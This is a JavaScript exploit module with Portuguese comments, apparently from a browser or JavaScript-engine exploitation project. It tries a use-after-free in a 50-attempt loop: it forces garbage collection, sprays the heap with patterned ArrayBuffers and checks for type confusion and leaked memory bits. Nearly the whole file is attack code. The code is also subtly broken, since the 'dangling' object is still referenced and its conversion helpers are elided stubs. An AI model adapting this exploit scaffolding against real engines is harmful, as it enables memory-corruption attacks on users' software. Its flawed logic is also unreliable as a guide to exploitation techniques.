// js/script3/testArrayBufferVictimCrash.mjs (v129 - UAF com Repetição)
// =======================================================================================
// LOG DE ALTERAÇÕES:
// - DIAGNÓSTICO: O UAF funciona, mas o heap spray não é confiável em uma única tentativa.
// - ESTRATÉGIA: A cadeia de exploração de UAF inteira foi envolvida em um loop de
//   repetição para combater a natureza probabilística da alocação de memória.
// - OBJETIVO: Aumentar drasticamente a chance de que, em uma das múltiplas tentativas,
//   nosso ArrayBuffer controlado ocupe o espaço de memória liberado.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';

export const FNAME_MODULE_FINAL = "UAF_v129_Looping";

// Número de vezes que tentaremos o exploit UAF.
const UAF_ATTEMPTS = 50;

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) { /* ...código sem alterações... */ }
function doubleToInt64(double) { /* ...código sem alterações... */ }

// --- Funções Auxiliares para a Cadeia de Exploração UAF ---
async function triggerGC_Hyper() {
    try {
        const temp_arr = [];
        for (let i = 0; i < 500; i++) {
            temp_arr.push(new ArrayBuffer(1024 * i));
            temp_arr.push(new Array(1024).fill({a: i}));
        }
    } catch (e) { /* Ignora erro de memória esgotada */ }
    await PAUSE_S3(100);
}

function createDanglingPointer() {
    let dangling_ref_internal = null;
    function createScope() {
        const victim = {
            p1: 0.1, p2: 0.2, p3: 0.3, p4: 0.4, p5: 0.5, p6: 0.6, p7: 0.7, 
            p8: 0.8, p9: 0.9, p10: 0.11, p11: 0.12, p12: 0.13, p13: 0.14, 
            p14: 0.15, p15: 0.16, p16: 0.17,
            corrupted_prop: 13.37
        };
        dangling_ref_internal = victim;
    }
    createScope();
    return dangling_ref_internal;
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: UAF com ${UAF_ATTEMPTS} Tentativas ---`, "test");

    let final_result = { success: false, message: `A cadeia UAF não obteve sucesso após ${UAF_ATTEMPTS} tentativas.` };

    // Loop principal para aumentar a chance de sucesso
    for (let attempt = 1; attempt <= UAF_ATTEMPTS; attempt++) {
        logS3(`--- Iniciando Tentativa UAF #${attempt}/${UAF_ATTEMPTS} ---`, "subtest");
        let spray_buffers = [];
        let dangling_ref = null;

        try {
            // FASE 1: Criar o Ponteiro Pendurado
            dangling_ref = createDanglingPointer();

            // FASE 2: Forçar a Coleta de Lixo
            await triggerGC_Hyper();

            // FASE 3: Pulverizar o heap para reocupar a memória
            for (let i = 0; i < 1024; i++) {
                const buf = new ArrayBuffer(136);
                const view = new BigUint64Array(buf);
                view[0] = 0x4141414141414141n; 
                view[1] = 0x4242424242424242n;
                spray_buffers.push(buf);
            }

            // FASE 4: Verificar a Confusão de Tipos
            const prop = dangling_ref.corrupted_prop;
            const prop_type = typeof prop;

            if (prop_type === 'number' && prop !== 13.37) {
                const leaked_bits = doubleToInt64(prop);
                logS3(`[SUCESSO NA TENTATIVA #${attempt}] Tipo confudido para 'number' com valor diferente do original!`, "vuln");
                logS3(`Bits vazados: ${toHex(leaked_bits)}`, "leak");
                
                if (leaked_bits.high() === 0x41414141 && leaked_bits.low() === 0x41414141) {
                    logS3("++++++++++++ SUCESSO FINAL! O padrão de spray foi encontrado! ++++++++++++", "vuln");
                    final_result = { success: true, message: "Controle de memória via UAF confirmado." };
                } else {
                    final_result = { success: true, message: `TC ocorreu, mas os bits (${toHex(leaked_bits)}) não correspondem ao padrão.` };
                }
                // Se encontramos, podemos parar o loop
                break; 
            } else {
                 logS3(`Tentativa #${attempt} falhou. Tipo: '${prop_type}', Valor: '${prop}'`, "info");
            }
        } catch (e) {
            logS3(`Tentativa #${attempt} encontrou uma exceção: ${e.message}`, "error");
        }
        // Limpa referências para a próxima iteração
        spray_buffers = null;
        dangling_ref = null;
        
        // Pausa curta entre as tentativas
        await PAUSE_S3(50); 
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
